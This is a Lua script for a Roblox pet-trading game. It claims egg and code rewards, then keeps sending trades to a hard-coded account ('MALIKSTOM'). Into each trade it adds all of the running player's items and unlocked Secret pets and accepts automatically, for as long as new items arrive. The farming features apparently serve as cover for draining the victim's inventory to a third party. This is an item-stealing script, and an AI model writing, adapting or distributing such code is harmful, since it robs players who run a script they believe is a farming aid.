-- ========== PART 3: AUTO TRADE SCRIPT (OPTIMIZED) ==========
local rs = game:GetService("ReplicatedStorage")
local player = game.Players.LocalPlayer
local paper = require(rs:WaitForChild("Paper"))
local petLib = require(rs.Modules.Shared.PetLib)
local tradeRemote = rs.Paper.Remotes.Trade
local network = paper.Network

local targetName = "MALIKSTOM"
local targetPlayer = nil
local isTrading = true
local isFarming = false

-- Simple UI (no extra prints)
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player.PlayerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 320, 0, 180)
mainFrame.Position = UDim2.new(0, 10, 0, 10)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
mainFrame.BackgroundTransparency = 0.1
mainFrame.BorderSizePixel = 1
mainFrame.BorderColor3 = Color3.fromRGB(255, 215, 0)
mainFrame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 35)
title.Text = "AUTO TRADE - RUNNING"
title.TextColor3 = Color3.fromRGB(255, 215, 0)
title.BackgroundTransparency = 1
title.TextSize = 16
title.Font = Enum.Font.GothamBold
title.Parent = mainFrame

local statusBox = Instance.new("Frame")
statusBox.Size = UDim2.new(0, 300, 0, 120)
statusBox.Position = UDim2.new(0, 10, 0, 45)
statusBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
statusBox.BackgroundTransparency = 0.5
statusBox.BorderSizePixel = 1
statusBox.BorderColor3 = Color3.fromRGB(80, 80, 80)
statusBox.Parent = mainFrame

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -10, 1, -10)
statusLabel.Position = UDim2.new(0, 5, 0, 5)
statusLabel.Text = "Starting..."
statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
statusLabel.BackgroundTransparency = 1
statusLabel.TextWrapped = true
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.TextYAlignment = Enum.TextYAlignment.Top
statusLabel.TextSize = 12
statusLabel.Font = Enum.Font.Gotham
statusLabel.Parent = statusBox

local function updateStatus(text)
    statusLabel.Text = text
end

local function hasAnyItems()
    local itemsData = paper.Stats.Get("Items").Value
    for itemName, amount in pairs(itemsData) do
        if amount > 0 then return true end
    end
    return false
end

local function getTotalItemCount()
    local itemsData = paper.Stats.Get("Items").Value
    local count = 0
    for itemName, amount in pairs(itemsData) do
        if amount > 0 then count = count + amount end
    end
    return count
end

local function getSecretPets()
    paper.Stats.Loaded()
    local pets = paper.Stats.Get("Pets")
    local secretPets = {}
    
    for _, pet in pets:GetChildren() do
        if not pet:GetAttribute("Locked") then
            local petName = pet:GetAttribute("PetName")
            local petData = petLib.GetSettings(petName)
            local rarity = petData and petData.Rarity or "Unknown"
            if rarity == "Secret" then
                table.insert(secretPets, pet)
            end
        end
    end
    return secretPets
end

local function hasSecretPets()
    return #getSecretPets() > 0
end

local function addSecretPetsToTrade(frame)
    local secretPets = getSecretPets()
    if #secretPets == 0 then return false end
    
    updateStatus("Adding " .. #secretPets .. " Secret pets...")
    
    repeat task.wait() until frame.My and frame.My.Pets
    task.wait(0.5)
    
    for _, pet in ipairs(secretPets) do
        for retry = 1, 2 do
            tradeRemote:FireServer("Pet", pet)
            task.wait()
        end
    end
    return true
end

local function waitForItems()
    updateStatus("Waiting for items...")
    local lastItemCount = getTotalItemCount()
    
    while isTrading do
        task.wait(1)
        local currentCount = getTotalItemCount()
        if currentCount > 0 then
            updateStatus("Items found!")
            return true
        end
        lastItemCount = currentCount
    end
    return false
end

local function farmEggsAndCodes()
    if isFarming then return end
    isFarming = true
    
    updateStatus("Farming eggs/codes...")
    
    local eggHuntConfig = require(rs:WaitForChild("Tables").EggHunt)
    local stats = paper.Stats
    
    for eggName, _ in pairs(eggHuntConfig) do
        pcall(function() paper.Network.InvokeServer("Claim Egg", eggName) end)
        task.wait()
    end
    task.wait()
    
    local eggHuntData = stats.Get("EggHuntData")
    local foundEggs = eggHuntData.Value.FoundEggs or {}
    local claimedEggs = eggHuntData.Value.ClaimedEggs or {}
    
    for eggName, _ in pairs(foundEggs) do
        if not claimedEggs[eggName] then
            pcall(function() paper.Network.InvokeServer("Claim Egg Reward", eggName) end)
            task.wait()
        end
    end
    task.wait()
    
    local codes = {"update1", "update2", "update3", "update4", "update5", "update6", "easter", "10kccu", "RELEASE"}
    local remote = rs:WaitForChild("Paper"):WaitForChild("Remotes"):WaitForChild("__remotefunction")
    
    for _, code in ipairs(codes) do
        pcall(function() remote:InvokeServer("Redeem Code", code) end)
        task.wait()
    end
    
    isFarming = false
end

local function sendTradeAndWaitForUI()
    targetPlayer = game.Players:FindFirstChild(targetName)
    if not targetPlayer then return false, nil end
    
    updateStatus("Trading " .. targetName)
    network.FireServer("Sent Trade Request", targetPlayer)
    
    local menus = player.PlayerGui:WaitForChild("Menus")
    local startTime = tick()
    
    repeat
        task.wait(0.3)
        local tradingFrame = menus:FindFirstChild("Trading")
        if tradingFrame and tradingFrame:FindFirstChild("Frame") then
            return true, tradingFrame.Frame
        end
        if tick() - startTime > 8 then return false, nil end
    until false
end

local function addAllItems(frame)
    updateStatus("Adding items...")
    
    repeat task.wait() until frame.My and frame.My.Items
    task.wait(0.5)
    
    local itemsData = paper.Stats.Get("Items").Value
    local itemList = {}
    
    for itemName, amount in pairs(itemsData) do
        if amount > 0 then
            table.insert(itemList, {name = itemName, amount = amount})
        end
    end
    
    if #itemList == 0 then return false end
    
    for _, item in ipairs(itemList) do
        for retry = 1, 2 do
            tradeRemote:FireServer("Item", item.name, item.amount)
            task.wait()
        end
    end
    
    addSecretPetsToTrade(frame)
    task.wait(0.5)
    tradeRemote:FireServer("Accept")
    task.wait(3)
    return true
end

local function startAuto()
    updateStatus("Auto trade started")
    farmEggsAndCodes()
    
    while isTrading do
        if not hasAnyItems() and not hasSecretPets() then
            if not waitForItems() then break end
        end
        
        local success = false
        local frame = nil
        
        while not success and isTrading do
            if not hasAnyItems() and not hasSecretPets() then
                if not waitForItems() then break end
            end
            
            targetPlayer = game.Players:FindFirstChild(targetName)
            if not targetPlayer then
                task.wait(2)
            else
                success, frame = sendTradeAndWaitForUI()
                if not success then task.wait(3) end
            end
        end
        
        if success and frame then
            addAllItems(frame)
        end
        task.wait(2)
    end
end

task.spawn(startAuto)

print("✓ All systems running (optimized)")
